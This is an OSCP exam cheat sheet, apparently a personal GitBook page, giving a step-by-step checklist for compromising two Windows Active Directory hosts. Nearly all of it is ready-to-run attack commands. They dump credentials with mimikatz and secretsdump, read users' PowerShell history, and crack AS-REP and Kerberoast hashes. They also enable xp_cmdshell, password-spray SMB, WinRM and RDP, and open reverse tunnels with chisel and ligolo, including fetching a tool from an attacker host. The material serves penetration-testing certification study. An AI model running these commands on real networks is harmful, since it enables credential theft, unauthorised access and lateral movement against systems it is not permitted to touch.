---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# OSCP

## üñ•Ô∏è MS01&#x20;

### üöÄ PE

* [x] <mark style="background-color:yellow;">Check user's privileges</mark>:

- `SeImpersonatePrivilege` ‚Üí [escalate to LA](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege)

```powershell
# List current user's privileges
whoami /priv
```

* [x] <mark style="background-color:yellow;">Look for custom binaries</mark>:&#x20;

- `strings` locally&#x20;
- [Binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking

### üîéPillaging

* [x] <mark style="background-color:yellow;">Dump cached credentials</mark>:

```powershell
# Dump active sessions' creds
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump the SAM registry hive
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump the LSA secrets
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```

* [x] <mark style="background-color:yellow;">Check PowerShell history</mark>:

{% code overflow="wrap" %}
```powershell
# Check the PS history of the current user
Get-Content (Get-PSReadlineOption).HistorySavePath

# Check the PS history of another user
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Enumerate domain users and build a wordlist</mark>:

{% code overflow="wrap" %}
```bash
$ nxc smb <target> -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Enumerate SMB shares</mark>

```bash
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

* [x] <mark style="background-color:yellow;">Check for</mark> [<mark style="background-color:yellow;">AS-REP Roasting</mark>](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/asreproasting):

{% code overflow="wrap" %}
```bash
# AS-REPRoast
impacket-GetNPUsers oscp.exam/ -dc-ip 10.10.X.X -no-pass -usersfile domain_users

# Crack obtained hashes
hashcat -m 18200 asreproast_users /usr/share/wordlists/rockyou -r /usr/share/hashcast/rules/best64.rule --force
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Check for</mark> [<mark style="background-color:yellow;">Kerberoasting</mark>](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/kerberoasting):

{% code overflow="wrap" %}
```bash
# Kerberoast
impacket-GetUserSPNs -request -dc-ip 10.10.X.X oscp.exam/<user>

# Crack obtained hashes
hashcat -m 13100 kerberoast_users /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

* If `sql_svc` ‚Üí interact directly:

{% code overflow="wrap" %}
```bash
# impacket
mssqlclient.py <domain>/<user>@<host> -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Remote queries
nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
# System RCE via xp_cmdshell
nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Password spray for lateral movement, PE, and remote access</mark>:

{% code overflow="wrap" %}
```bash
# Pass-spray for lateral movement/PE (local auth)
nxc smb domain_ips -u domain_users -p passwords --continue-on-success --local-auth | grep +

# Pass-spray for lateral movement/PE
nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +

# Pass-spray for WinRM access
nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +

# Pass-spray for RDP access
nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
```
{% endcode %}

### üñß Pivot

* [x] <mark style="background-color:yellow;">Start the server on the attacking host</mark>:

```bash
# Start proxy
sudo ligolo-proxy -selfcert

# Create the interface
ligolo-ng ¬ª interface_create --name ligolo
```

* [x] <mark style="background-color:yellow;">Start the agent on the pivot host</mark>:

```powershell
# Connect to the proxy
.\agent.exe -connect 192.168.X.X:11601 -ignore-cert
```

* [x] <mark style="background-color:yellow;">Set up routing on the attacking host</mark>:

```bash
# List active sessions
ligolo-ng ¬ª session

# Add route
ligolo-ng ¬ª interface_add_route --name ligolo --route 172.16.10.0/24

# Start the tunnel
ligolo-ng ¬ª start
```

## üñ•Ô∏è MS02

### üöÄ PE

* [x] <mark style="background-color:yellow;">Connect via WinRM or RDP</mark>:

```bash
# Connect via WinRM
evil-winrm -u <user> -p <pass> -i <MS02>

# Connect via RDP
xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
```

* [x] <mark style="background-color:yellow;">Check user's privileges</mark>:

```powershell
# List current user's privileges
whoami /priv
```

* [x] <mark style="background-color:yellow;">Check SMB access:</mark>

```bash
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

* [x] <mark style="background-color:yellow;">Check for</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`C:\windows.old`</mark>:

- Dump `SAM` and `SYSTEM` locally

```bash
# Dump SAM's hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

* [x] <mark style="background-color:yellow;">Look for custom binaries</mark>:&#x20;

- `strings` locally&#x20;
- [Binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking

* [x] <mark style="background-color:yellow;">Check for locally active sockets</mark>:

- Port forward

```powershell
# List active sockets
netstat -ano
```

```bash
# Start server on the attacking host
$ ./chisel server -p 8000 --reverse
```

```powershell
# Tranfer binary
wget http://192.168.X.X:8888/chisel.exe -o chisel.exe

# Start client on target
# 3306 (target port) to 6033 (local port) 
.\chisel.exe client 192.168.45.157:8000 R:3306:127.0.0.1:6033
```

```bash
# Interact from attacking host
$ mysql -h 127.0.0.1 -P 3306 -u root
```

* [x] <mark style="background-color:yellow;">Check PowerShell history</mark>:

{% code overflow="wrap" %}
```powershell
# Check the PS history of the current user
Get-Content (Get-PSReadlineOption).HistorySavePath

# Check the PS history of another user
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Password spray for potential PE (DA/LA on the DC)</mark>:

{% code overflow="wrap" %}
```bash
# Pass-spray for PE (local auth)
nxc smb <dc-ip> -u domain_users -p passwords --continue-on-success --local-auth | grep +

# Pass-spray for PE
nxc smb <dc-ip> -u domain_users -p passwords --continue-on-success | grep +
```
{% endcode %}
